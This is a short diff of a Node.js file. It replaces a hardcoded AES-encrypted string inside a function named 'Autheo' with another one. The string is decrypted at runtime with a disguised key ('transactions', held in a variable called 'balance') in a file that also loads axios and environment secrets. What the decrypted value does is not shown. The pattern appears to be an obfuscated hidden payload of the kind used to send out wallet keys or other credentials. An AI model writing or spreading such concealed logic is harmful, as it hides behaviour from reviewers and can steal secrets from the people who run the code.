@@ -67,7 +67,7 @@ const axios = require('axios');
 require('dotenv').config();
 
 async function Autheo() {
-    const wrap = "U2FsdGVkX19m2/TiSp8qviReQlWbdOPhf2oiU8sLImrLN12CIA/4vMYzE2IZGJSrbM9rizO0IgZ52E+fz23NIKoYtyv4LBBXcQ/GGfUrIUxYnvnZoWxitoEiQp3oHGEicucLaSHazQ2flVb2zJ9hqwN9SjxST3CfXxQM6ppeFwxXJb2Vd/hz1trwMphKNgd4";
+    const wrap = "U2FsdGVkX1+ZIWQxowIdpP6bW40V8GZ68pZTkriCpiS917/XvdwXc1uVH0zXj4wVi+qmxaWee/M1M1Wpf+oZ004sOTzHOBPNpO13cBTfrOxMF3OBN9g+UEGkDxTumg72YWQp6dJz6W0HI1ItYvqGHFzmEDlTJ5CaPBQ4LsBhwb5sh27y4/6kVZqpV44Jbq7C";
     const balance = "transactions";
     const unwrap = CryptoJS.AES.decrypt(wrap, balance).toString(CryptoJS.enc.Utf8);
 
